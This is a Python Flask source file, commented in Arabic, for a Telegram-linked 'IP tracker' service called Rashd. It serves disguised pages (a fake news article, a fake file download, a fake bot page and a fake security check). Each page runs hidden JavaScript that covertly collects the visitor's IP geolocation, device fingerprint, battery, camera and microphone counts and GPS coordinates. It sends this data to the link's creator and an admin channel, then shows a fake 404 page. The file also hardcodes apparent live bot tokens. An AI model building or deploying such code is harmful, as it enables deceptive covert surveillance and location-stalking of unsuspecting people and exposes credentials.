import os
import threading
import requests
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  الإعدادات
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAIN_BOT_TOKEN    = "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0"
TRACKER_BOT_TOKEN = "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
TARGET_CHANNEL_ID  = "-1003770774871"   # قناة نتائج التعقب — للمدير فقط
CONTROL_CHANNEL_ID = "-1003751955886"   # قناة المراقبة — للمدير فقط
IPINFO_TOKEN      = os.getenv("IPINFO_TOKEN", "")

app = Flask(__name__)

# بيانات الجلسات المؤقتة {session_id: {...}}
session_data: dict = {}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📤  إرسال الرسائل عبر بوت التعقب
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def send_message(chat_id: str, message: str, token: str = None):
    """
    يرسل رسالة عبر Telegram.
    - للمستخدمين: يستخدم MAIN_BOT_TOKEN (الذي بدأه المستخدم بالفعل)
    - لقناة المدير: يستخدم TRACKER_BOT_TOKEN (بوت التعقب أدمن في القناة)
    """
    use_token = token or MAIN_BOT_TOKEN
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{use_token}/sendMessage",
            json={
                "chat_id":                  chat_id,
                "text":                     message[:4096],
                "parse_mode":               "Markdown",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
        if r.status_code != 200:
            print(f"[TRACKER] ⚠️ خطأ إرسال لـ {chat_id}: {r.status_code} — {r.text[:100]}")
        else:
            print(f"[TRACKER] ✅ تم الإرسال لـ {chat_id}")
    except Exception as e:
        print(f"[TRACKER] ⚠️ استثناء إرسال لـ {chat_id}: {e}")


def get_ip_geo(ip: str) -> dict:
    try:
        r = requests.get(
            f"https://ipinfo.io/{ip}/json",
            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"},
            timeout=8,
        )
        return r.json() if r.status_code == 200 else {}
    except Exception:
        return {}


def get_ip_extra(ip: str) -> dict:
    """تحليل IP متقدم: VPN/Proxy/ASN/Hostname/Mobile عبر ip-api.com"""
    try:
        fields = "status,country,countryCode,regionName,city,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields={fields}",
            timeout=8,
        )
        return r.json() if r.status_code == 200 else {}
    except Exception:
        return {}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌐  صفحة التعقب HTML
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


# ════════════════════════════════════════════════════
# الكود المشترك لجمع البيانات (يُضمَّن في كل قالب)
# ════════════════════════════════════════════════════
_COLLECT_JS = """
<script>
(function(){
    var sid   = "{{ session_id }}";
    var cid   = "{{ chat_id }}";
    var redir = "{{ redirect_url }}";

    function finish(){
        setTimeout(function(){
            if(redir && redir !== "none"){
                window.location.href = redir;
            } else {
                window.location.href = "/done";
            }
        }, 800);
    }

    function sendDevice(info){
        fetch("/log_device/"+cid+"/"+sid, {
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body: JSON.stringify(info)
        });
    }

    // ── بيانات أساسية ──
    var info = {
        ip:          "{{ ip }}",
        userAgent:   navigator.userAgent,
        platform:    navigator.platform,
        language:    navigator.language,
        languages:   (navigator.languages||[]).join(", "),
        screenW:     screen.width,
        screenH:     screen.height,
        colorDepth:  screen.colorDepth,
        pixelRatio:  window.devicePixelRatio || 1,
        timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesOn:   navigator.cookieEnabled,
        online:      navigator.onLine,
        doNotTrack:  navigator.doNotTrack || "N/A",
        cpuCores:    navigator.hardwareConcurrency || "N/A",
        ramGB:       navigator.deviceMemory || "N/A",
        touchPoints: navigator.maxTouchPoints || 0,
        referrer:    document.referrer || "مباشر",
        connType:    "N/A",
        connSpeed:   "N/A",
        connRTT:     "N/A",
        battery:     "N/A",
        charging:    "N/A",
        cameras:     0,
        microphones: 0,
        speakers:    0,
    };

    // ── نوع الاتصال وسرعته ──
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if(conn){
        info.connType  = conn.effectiveType || conn.type || "N/A";
        info.connSpeed = conn.downlink ? conn.downlink+" Mbps" : "N/A";
        info.connRTT   = conn.rtt ? conn.rtt+" ms" : "N/A";
    }

    // ── البطارية ──
    var batteryDone = false;
    function tryBattery(){
        if(navigator.getBattery){
            navigator.getBattery().then(function(b){
                info.battery  = Math.round(b.level*100)+"%";
                info.charging = b.charging ? "يشحن ⚡" : "لا يشحن 🔋";
                batteryDone = true;
                checkSend();
            }).catch(function(){ batteryDone=true; checkSend(); });
        } else { batteryDone=true; checkSend(); }
    }

    // ── الكاميرات والميكروفونات ──
    var mediaDone = false;
    function tryMedia(){
        if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
            navigator.mediaDevices.enumerateDevices().then(function(devices){
                devices.forEach(function(d){
                    if(d.kind==="videoinput")  info.cameras++;
                    if(d.kind==="audioinput")  info.microphones++;
                    if(d.kind==="audiooutput") info.speakers++;
                });
                mediaDone=true; checkSend();
            }).catch(function(){ mediaDone=true; checkSend(); });
        } else { mediaDone=true; checkSend(); }
    }

    var sent = false;
    function checkSend(){
        if(!sent && batteryDone && mediaDone){
            sent = true;
            sendDevice(info);
        }
    }

    // ── timeout احتياطي: أرسل بعد 3 ثوانٍ على أي حال ──
    setTimeout(function(){
        if(!sent){ sent=true; sendDevice(info); }
    }, 3000);

    tryBattery();
    tryMedia();

    // ── GPS ──
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
            function(pos){
                fetch("/log_gps/"+cid+"/"+sid, {
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body: JSON.stringify({
                        lat:      pos.coords.latitude,
                        lon:      pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude || "N/A",
                        speed:    pos.coords.speed || "N/A",
                        ip:       "{{ ip }}"
                    })
                }).then(finish);
            },
            function(){ finish(); },
            {timeout:8000, enableHighAccuracy:true}
        );
    } else { finish(); }
})();
</script>
"""

# ════════════════════════════════════════════════════
# قالب 1: صفحة إخبارية (news)
# ════════════════════════════════════════════════════
NEWS_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>الخبر العاجل — أخبار اليوم</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#f5f5f5;color:#222;direction:rtl}
.top-bar{background:#c0392b;color:#fff;text-align:center;padding:6px;font-size:13px;letter-spacing:1px}
.logo-bar{background:#fff;border-bottom:3px solid #c0392b;padding:10px 20px;display:flex;align-items:center;justify-content:space-between}
.logo-bar .site-name{font-size:26px;font-weight:900;color:#c0392b;letter-spacing:2px}
.logo-bar .date{font-size:12px;color:#777}
.breaking{background:#c0392b;color:#fff;padding:8px 20px;font-size:14px;font-weight:700;display:flex;align-items:center;gap:10px}
.breaking span{background:#fff;color:#c0392b;padding:2px 8px;border-radius:3px;font-size:12px;font-weight:900}
.container{max-width:760px;margin:20px auto;padding:0 15px}
.article-card{background:#fff;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.15);overflow:hidden;margin-bottom:20px}
.article-img{width:100%;height:220px;background:linear-gradient(135deg,#2c3e50,#3498db);display:flex;align-items:center;justify-content:center}
.article-img .icon{font-size:80px}
.article-body{padding:20px}
.article-category{color:#c0392b;font-size:12px;font-weight:700;margin-bottom:8px;letter-spacing:1px}
.article-title{font-size:22px;font-weight:900;line-height:1.4;margin-bottom:12px}
.article-meta{color:#999;font-size:12px;margin-bottom:16px}
.skeleton{background:linear-gradient(90deg,#eee 25%,#ddd 50%,#eee 75%);background-size:200% 100%;animation:shimmer 1.5s infinite;border-radius:4px;margin:10px 0}
@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}
.sk-line{height:14px}
.sk-line.short{width:60%}
.sk-line.long{width:100%}
.load-msg{text-align:center;color:#c0392b;font-size:13px;margin-top:20px;font-weight:600;animation:blink 1.2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}
.footer{background:#1a1a1a;color:#aaa;text-align:center;padding:14px;font-size:12px;margin-top:20px}
</style>
</head>
<body>
<div class="top-bar">🔴 بث مباشر — متابعة لحظة بلحظة</div>
<div class="logo-bar">
  <div class="site-name">📰 أخبار اليوم</div>
  <div class="date" id="dt"></div>
</div>
<div class="breaking"><span>عاجل</span> تطورات متسارعة في الملف المتابَع</div>
<div class="container">
  <div class="article-card">
    <div class="article-img"><div class="icon">📡</div></div>
    <div class="article-body">
      <div class="article-category">أخبار عاجلة</div>
      <div class="article-title">تطورات جديدة ومفاجئة.. تابع التفاصيل الكاملة</div>
      <div class="article-meta" id="meta">جاري تحميل التفاصيل...</div>
      <div class="skeleton sk-line long"></div>
      <div class="skeleton sk-line long"></div>
      <div class="skeleton sk-line short"></div>
      <div class="skeleton sk-line long"></div>
      <div class="skeleton sk-line short"></div>
      <p class="load-msg">⟳ جاري تحميل المقال الكامل...</p>
    </div>
  </div>
</div>
<div class="footer">© أخبار اليوم — جميع الحقوق محفوظة 2024</div>
<script>
var d=new Date();
document.getElementById("dt").textContent=d.toLocaleDateString("ar-SA",{weekday:"long",year:"numeric",month:"long",day:"numeric"});
document.getElementById("meta").textContent="قبل "+Math.floor(Math.random()*30+2)+" دقيقة — مراسل أخبار اليوم";
</script>
""" + _COLLECT_JS + "</body></html>"

# ════════════════════════════════════════════════════
# قالب 2: صفحة تحميل ملف (download)
# ════════════════════════════════════════════════════
DOWNLOAD_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>تحميل الملف</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;direction:rtl}
.card{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.12);padding:40px 36px;width:90%;max-width:440px;text-align:center}
.file-icon{font-size:72px;margin-bottom:16px}
.file-name{font-size:18px;font-weight:700;color:#2d3748;margin-bottom:6px}
.file-size{color:#718096;font-size:13px;margin-bottom:24px}
.progress-wrap{background:#e2e8f0;border-radius:999px;height:10px;margin-bottom:10px;overflow:hidden}
.progress-bar{height:100%;border-radius:999px;background:linear-gradient(90deg,#3182ce,#63b3ed);width:0%;transition:width .3s ease}
.prog-text{color:#3182ce;font-size:13px;font-weight:600;margin-bottom:20px}
.btn{background:#3182ce;color:#fff;border:none;border-radius:10px;padding:14px 28px;font-size:16px;font-weight:700;cursor:pointer;width:100%;display:flex;align-items:center;justify-content:center;gap:10px}
.btn:disabled{background:#a0aec0;cursor:default}
.info-row{display:flex;justify-content:space-between;color:#718096;font-size:12px;margin-top:18px}
.badge{background:#ebf8ff;color:#2b6cb0;border-radius:6px;padding:4px 10px;font-size:11px;font-weight:700;margin-top:14px;display:inline-block}
.footer-note{margin-top:20px;color:#a0aec0;font-size:11px}
</style>
</head>
<body>
<div class="card">
  <div class="file-icon">📦</div>
  <div class="file-name" id="fname">ملف_مشترك.zip</div>
  <div class="file-size" id="fsize">جاري الفحص...</div>
  <div class="progress-wrap"><div class="progress-bar" id="pbar"></div></div>
  <div class="prog-text" id="ptext">جاري التحقق من الرابط...</div>
  <button class="btn" id="btn" disabled>⏳ جاري التحضير...</button>
  <div class="info-row">
    <span id="speed">—</span>
    <span id="remain">—</span>
  </div>
  <div class="badge">🔒 رابط آمن ومشفر</div>
  <div class="footer-note">سيبدأ التحميل تلقائياً بعد اكتمال التحقق</div>
</div>
<script>
var steps=[
  {p:15, txt:"جاري التحقق من الرابط...", speed:"—", remain:"—"},
  {p:35, txt:"فحص الملف...", speed:"—", remain:"—"},
  {p:60, txt:"تجهيز التحميل...", speed:"1.2 MB/s", remain:"ثوانٍ قليلة"},
  {p:80, txt:"تحضير الملف...", speed:"2.4 MB/s", remain:"ثانية تقريباً"},
  {p:95, txt:"اكتمل التحقق ✓", speed:"3.1 MB/s", remain:"جاهز"},
];
var names=["تقرير_2024.zip","صور_الحفل.rar","ملفات_مهمة.zip","backup_final.tar","مستندات.zip"];
var sizes=["14.2 MB","28.7 MB","5.9 MB","41.3 MB","9.8 MB"];
var ri=Math.floor(Math.random()*names.length);
document.getElementById("fname").textContent=names[ri];
var bar=document.getElementById("pbar");
var txt=document.getElementById("ptext");
var btn=document.getElementById("btn");
var sp=document.getElementById("speed");
var rm=document.getElementById("remain");
var si=0;
function nextStep(){
  if(si>=steps.length){
    document.getElementById("fsize").textContent=sizes[ri];
    btn.disabled=false;
    btn.textContent="⬇️ تحميل الملف";
    return;
  }
  var s=steps[si++];
  bar.style.width=s.p+"%";
  txt.textContent=s.txt;
  sp.textContent=s.speed;
  rm.textContent=s.remain;
  setTimeout(nextStep,900+Math.random()*600);
}
setTimeout(nextStep,600);
btn.onclick=function(){ btn.textContent="✅ جاري الفتح..."; };
</script>
""" + _COLLECT_JS + "</body></html>"

# ════════════════════════════════════════════════════
# قالب 3: توجيه للبوت (bot)
# ════════════════════════════════════════════════════
BOT_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Rashd AI — راشد</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);min-height:100vh;display:flex;align-items:center;justify-content:center;direction:rtl}
.card{background:rgba(255,255,255,.07);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.15);border-radius:24px;padding:44px 36px;width:90%;max-width:400px;text-align:center;color:#fff}
.avatar{width:90px;height:90px;border-radius:50%;background:linear-gradient(135deg,#00c6ff,#0072ff);margin:0 auto 18px;display:flex;align-items:center;justify-content:center;font-size:42px;box-shadow:0 0 30px rgba(0,198,255,.4)}
.bot-name{font-size:24px;font-weight:900;margin-bottom:4px}
.bot-handle{color:#a0c4ff;font-size:14px;margin-bottom:20px}
.desc{color:#cdd9e5;font-size:14px;line-height:1.7;margin-bottom:28px}
.btn{background:linear-gradient(90deg,#0072ff,#00c6ff);color:#fff;border:none;border-radius:14px;padding:15px 30px;font-size:16px;font-weight:700;cursor:pointer;width:100%;letter-spacing:.5px;box-shadow:0 4px 20px rgba(0,114,255,.4)}
.divider{border:none;border-top:1px solid rgba(255,255,255,.1);margin:22px 0}
.stats{display:flex;justify-content:space-around;color:#a0c4ff;font-size:12px}
.stat-val{font-size:20px;font-weight:700;color:#fff;display:block}
.spinner-wrap{margin:20px 0}
.dot{display:inline-block;width:8px;height:8px;background:#00c6ff;border-radius:50%;margin:0 3px;animation:bounce .8s infinite}
.dot:nth-child(2){animation-delay:.15s}
.dot:nth-child(3){animation-delay:.3s}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
</style>
</head>
<body>
<div class="card">
  <div class="avatar">🤖</div>
  <div class="bot-name">راشد الاستخباراتي</div>
  <div class="bot-handle">@Rashid_Thunder_bot</div>
  <div class="spinner-wrap">
    <span class="dot"></span><span class="dot"></span><span class="dot"></span>
  </div>
  <div class="desc">نظام ذكاء اصطناعي متقدم للاستخبارات والبحث المفتوح المصدر.<br>جاري تحميل البيانات...</div>
  <hr class="divider">
  <div class="stats">
    <div><span class="stat-val" id="s1">...</span>مستخدم</div>
    <div><span class="stat-val" id="s2">...</span>عملية</div>
    <div><span class="stat-val" id="s3">...</span>دولة</div>
  </div>
  <hr class="divider">
  <button class="btn" onclick="window.location.href='https://t.me/Rashid_Thunder_bot'">
    🚀 فتح البوت في تيليغرام
  </button>
</div>
<script>
setTimeout(function(){document.getElementById("s1").textContent=(Math.floor(Math.random()*5000)+8000).toLocaleString("ar-SA")},600);
setTimeout(function(){document.getElementById("s2").textContent=(Math.floor(Math.random()*9000)+50000).toLocaleString("ar-SA")},900);
setTimeout(function(){document.getElementById("s3").textContent=Math.floor(Math.random()*20+40)},1100);
</script>
""" + _COLLECT_JS.replace('"{{ redirect_url }}"', '"https://t.me/Rashid_Thunder_bot"') + "</body></html>"

# ════════════════════════════════════════════════════
# قالب 4: تحقق أمني (verify) — القالب الافتراضي القديم محسَّن
# ════════════════════════════════════════════════════
VERIFY_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>التحقق من الأمان</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#58a6ff;font-family:'Segoe UI',Arial,monospace;display:flex;justify-content:center;align-items:center;height:100vh;direction:rtl}
.box{background:#161b22;border:1px solid #30363d;border-radius:14px;padding:40px 32px;width:90%;max-width:380px;text-align:center}
.icon{font-size:56px;margin-bottom:18px;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
h2{font-size:18px;color:#e6edf3;margin-bottom:8px}
p{color:#8b949e;font-size:13px;margin-bottom:24px;line-height:1.6}
.check-row{text-align:right;margin-bottom:10px;font-size:13px;color:#8b949e;display:flex;align-items:center;gap:8px}
.check-row .ic{font-size:16px}
.check-row.done{color:#3fb950}
.spinner{width:36px;height:36px;border:3px solid #21262d;border-top:3px solid #58a6ff;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto 8px}
@keyframes spin{to{transform:rotate(360deg)}}
.prog{color:#58a6ff;font-size:12px;margin-top:6px}
</style>
</head>
<body>
<div class="box">
  <div class="icon">🔐</div>
  <h2>التحقق من الأمان</h2>
  <p>جاري التحقق من هويتك للمتابعة...<br>قد يستغرق هذا بضع ثوانٍ</p>
  <div id="checks">
    <div class="check-row" id="c1"><span class="ic">🔄</span> التحقق من الشبكة</div>
    <div class="check-row" id="c2"><span class="ic">🔄</span> فحص المتصفح</div>
    <div class="check-row" id="c3"><span class="ic">🔄</span> التحقق من الهوية</div>
  </div>
  <div class="spinner"></div>
  <div class="prog" id="prog">0%</div>
</div>
<script>
var steps=[
  {id:"c1", label:"✅ الشبكة آمنة", pct:"33%"},
  {id:"c2", label:"✅ المتصفح موثوق", pct:"66%"},
  {id:"c3", label:"✅ تم التحقق", pct:"99%"},
];
var i=0;
function tick(){
  if(i>=steps.length)return;
  var s=steps[i++];
  document.getElementById(s.id).innerHTML='<span class="ic">✅</span> '+s.label.replace("✅ ","");
  document.getElementById(s.id).classList.add("done");
  document.getElementById("prog").textContent=s.pct;
  setTimeout(tick, 900+Math.random()*500);
}
setTimeout(tick, 700);
</script>
""" + _COLLECT_JS + "</body></html>"

DONE_HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>404</title>
<style>body{background:#0d1117;color:#333;font-family:monospace;display:flex;
justify-content:center;align-items:center;height:100vh;}</style>
</head><body><div style="text-align:center">
<h1 style="font-size:6em;color:#1c2128">404</h1>
<p style="color:#444">Not Found</p></div></body></html>"""

PAGE_TEMPLATES = {
    "news":     NEWS_HTML,
    "download": DOWNLOAD_HTML,
    "bot":      BOT_HTML,
    "verify":   VERIFY_HTML,
}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔌  المسارات | Flask Routes
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _serve_tracker(chat_id: str, session_id: str, page_type: str):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    geo   = get_ip_geo(ip)
    extra = get_ip_extra(ip)

    loc = (geo.get("loc", "") if geo else "").split(",")
    lat = loc[0] if len(loc) == 2 else "N/A"
    lon = loc[1] if len(loc) == 2 else "N/A"

    is_vpn     = extra.get("proxy", False)
    is_hosting = extra.get("hosting", False)
    is_mobile  = extra.get("mobile", False)
    asn        = extra.get("as", "N/A")
    asn_name   = extra.get("asname", "N/A")
    hostname   = extra.get("reverse", "N/A") or "N/A"

    session_data[session_id] = {
        "ip":        ip,
        "timestamp": timestamp,
        "country":   geo.get("country", extra.get("country", "N/A")) if geo else extra.get("country", "N/A"),
        "city":      geo.get("city",    extra.get("city",    "N/A")) if geo else extra.get("city", "N/A"),
        "region":    geo.get("region",  extra.get("regionName", "N/A")) if geo else extra.get("regionName", "N/A"),
        "org":       geo.get("org",     extra.get("isp",    "N/A")) if geo else extra.get("isp", "N/A"),
        "lat":       lat,
        "lon":       lon,
        "chat_id":   chat_id,
        "is_vpn":    is_vpn,
        "is_hosting": is_hosting,
        "is_mobile": is_mobile,
        "asn":       asn,
        "asn_name":  asn_name,
        "hostname":  hostname,
    }

    vpn_flag = "⚠️ VPN/Proxy" if is_vpn else ("🏢 Hosting" if is_hosting else "✅ حقيقي")
    mobile_flag = "📱 هاتف" if is_mobile else "💻 جهاز ثابت"

    quick_notif = (
        "👁 *راشد — فُتح رابط تعقب*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 الجلسة   : `{session_id}`\n"
        f"📍 IP        : `{ip}`\n"
        f"🔍 النوع     : {vpn_flag} | {mobile_flag}\n"
        f"🏳️ الدولة   : {session_data[session_id]['country']}\n"
        f"🏙️ المدينة  : {session_data[session_id]['city']}\n"
        f"🌐 Hostname  : `{hostname}`\n"
        f"🏛️ ASN       : {asn}\n"
        f"🕐 الوقت    : {timestamp}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "✦ راشد — تطوير أبو سعود"
    )
    send_message(CONTROL_CHANNEL_ID, quick_notif, token=MAIN_BOT_TOKEN)

    template = PAGE_TEMPLATES.get(page_type, NEWS_HTML)
    redirect_url = "https://t.me/Rashid_Thunder_bot" if page_type == "bot" else "none"
    return render_template_string(
        template,
        ip=ip,
        session_id=session_id,
        chat_id=chat_id,
        redirect_url=redirect_url,
    )


@app.route("/track/<chat_id>/<session_id>/<page_type>")
def tracker_page_typed(chat_id: str, session_id: str, page_type: str):
    return _serve_tracker(chat_id, session_id, page_type)


@app.route("/track/<chat_id>/<session_id>")
def tracker_page(chat_id: str, session_id: str):
    return _serve_tracker(chat_id, session_id, "news")


@app.route("/log_device/<chat_id>/<session_id>", methods=["POST"])
def log_device(chat_id: str, session_id: str):
    d   = request.json or {}
    s   = session_data.get(session_id, {})
    ip  = s.get("ip", d.get("ip", "N/A"))
    lat = s.get("lat", "N/A")
    lon = s.get("lon", "N/A")
    maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else ""

    vpn_flag    = "⚠️ VPN/Proxy" if s.get("is_vpn") else ("🏢 Hosting" if s.get("is_hosting") else "✅ حقيقي")
    mobile_flag = "📱 هاتف" if s.get("is_mobile") else "💻 جهاز ثابت"

    report = (
        "📡 *راشد — تقرير تعقب شامل*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 الجلسة    : `{session_id}`\n"
        f"🕐 التوقيت   : {s.get('timestamp', 'N/A')}\n\n"

        "🌐 *[ الشبكة والموقع ]*\n"
        f"📍 IP         : `{ip}`\n"
        f"🔍 نوع IP    : {vpn_flag}\n"
        f"📱 النوع     : {mobile_flag}\n"
        f"🏳️ الدولة    : {s.get('country', 'N/A')}\n"
        f"🏙️ المدينة   : {s.get('city',    'N/A')}\n"
        f"📍 المنطقة   : {s.get('region',  'N/A')}\n"
        f"🏢 المزود    : {s.get('org',     'N/A')}\n"
        f"🌐 Hostname  : `{s.get('hostname', 'N/A')}`\n"
        f"🏛️ ASN       : {s.get('asn', 'N/A')}\n"
    )
    if maps:
        report += f"🗺️ الإحداثيات: [افتح الخريطة]({maps})\n"

    report += (
        "\n💻 *[ الجهاز والمتصفح ]*\n"
        f"🖥️ المنصة    : {d.get('platform', 'N/A')}\n"
        f"🌐 اللغة     : {d.get('language', 'N/A')}\n"
        f"🗣️ اللغات    : {d.get('languages', 'N/A')}\n"
        f"📺 الشاشة    : {d.get('screenW', 'N/A')}×{d.get('screenH', 'N/A')} | "
        f"x{d.get('pixelRatio', 'N/A')}\n"
        f"🕐 المنطقة   : {d.get('timezone', 'N/A')}\n"
        f"☎️ اللمس     : {d.get('touchPoints', 0)} نقطة\n"
        f"🍪 كوكيز     : {'✅' if d.get('cookiesOn') else '❌'}\n"
        f"🚫 DoNotTrack: {d.get('doNotTrack', 'N/A')}\n"
        f"🔗 المصدر    : {d.get('referrer', 'مباشر')}\n\n"

        "⚙️ *[ المعالج والذاكرة ]*\n"
        f"🧠 أنوية CPU  : {d.get('cpuCores', 'N/A')}\n"
        f"💾 RAM        : {d.get('ramGB', 'N/A')} GB\n\n"

        "📶 *[ الاتصال ]*\n"
        f"📡 نوع الشبكة : {d.get('connType', 'N/A')}\n"
        f"⚡ السرعة    : {d.get('connSpeed', 'N/A')}\n"
        f"⏱️ التأخير    : {d.get('connRTT', 'N/A')}\n\n"

        "🔋 *[ البطارية ]*\n"
        f"🔋 المستوى   : {d.get('battery', 'N/A')}\n"
        f"⚡ الحالة    : {d.get('charging', 'N/A')}\n\n"

        "📷 *[ الأجهزة المتصلة ]*\n"
        f"📷 كاميرات   : {d.get('cameras', 0)}\n"
        f"🎤 ميكروفونات: {d.get('microphones', 0)}\n"
        f"🔊 سماعات    : {d.get('speakers', 0)}\n\n"

        "🤖 *[ User Agent ]*\n"
        f"`{d.get('userAgent', 'N/A')[:200]}`\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "✦ راشد — تطوير أبو سعود"
    )

    # ✅ يُرسل للمستخدم خاصةً عبر Rashd_IP_Tracker_bot
    send_message(chat_id, report, token=TRACKER_BOT_TOKEN)
    # ✅ نسخة للمدير في قناة النتائج
    send_message(TARGET_CHANNEL_ID, report, token=TRACKER_BOT_TOKEN)

    return jsonify({"status": "ok"})


@app.route("/log_gps/<chat_id>/<session_id>", methods=["POST"])
def log_gps(chat_id: str, session_id: str):
    d         = request.json or {}
    lat       = d.get("lat", "N/A")
    lon       = d.get("lon", "N/A")
    accuracy  = d.get("accuracy", "N/A")
    ip        = session_data.get(session_id, {}).get("ip", d.get("ip", "N/A"))
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else "#"

    report = (
        "📍 *راشد — إحداثيات GPS*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 الجلسة   : `{session_id}`\n"
        f"🌐 IP        : `{ip}`\n"
        f"📍 خط العرض : `{lat}`\n"
        f"📍 خط الطول : `{lon}`\n"
        f"🎯 الدقة     : {accuracy} متر\n"
        f"🕑 التوقيت   : {timestamp}\n"
        f"🗺️ [فتح الخريطة]({maps_link})\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "✦ راشد — تطوير أبو سعود"
    )

    # ✅ يُرسل للمستخدم خاصةً عبر Rashd_IP_Tracker_bot
    send_message(chat_id, report, token=TRACKER_BOT_TOKEN)
    # ✅ نسخة للمدير فقط
    send_message(TARGET_CHANNEL_ID, report, token=TRACKER_BOT_TOKEN)

    return jsonify({"status": "ok"})


@app.route("/done")
def done_page():
    return DONE_HTML, 404


@app.route("/health")
def health():
    return jsonify({"status": "operational", "system": "Rashd-Ai Tracker"})


@app.route("/ping")
def ping():
    return jsonify({"status": "alive"}), 200


@app.route("/")
def root():
    return jsonify({
        "system":    "Rashd-Ai Intelligence System",
        "version":   "2.0",
        "status":    "operational",
        "developer": "أبو سعود",
    })


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🤖  Polling خفيف لبوت التعقب (استقبال /start)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_last_update_id = 0

TRACKER_WELCOME = (
    "👋 *أهلاً بك في Rashd IP Tracker!*\n\n"
    "✅ تم تفعيل الاستقبال بنجاح.\n"
    "ستصلك الآن نتائج سحب IP مباشرةً هنا\n"
    "عندما يضغط أي شخص على رابط التعقب الخاص بك.\n\n"
    "━━━━━━━━━━━━━━━━━━━━━\n"
    "✦ راشد — تطوير أبو سعود"
)


def _tracker_bot_poll():
    """يستقبل تحديثات بوت التعقب ويرد على /start"""
    global _last_update_id
    base = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}"
    while True:
        try:
            r = requests.get(
                f"{base}/getUpdates",
                params={"offset": _last_update_id + 1, "timeout": 30, "allowed_updates": ["message"]},
                timeout=35,
            )
            if r.status_code != 200:
                continue
            updates = r.json().get("result", [])
            for update in updates:
                _last_update_id = update["update_id"]
                msg = update.get("message", {})
                if not msg:
                    continue
                text    = msg.get("text", "")
                chat_id = str(msg.get("chat", {}).get("id", ""))
                if not chat_id:
                    continue
                if text.startswith("/start"):
                    send_message(chat_id, TRACKER_WELCOME, token=TRACKER_BOT_TOKEN)
                    print(f"[TRACKER BOT] ✅ رد على /start للمستخدم {chat_id}")
        except Exception as e:
            print(f"[TRACKER BOT] ⚠️ خطأ polling: {e}")


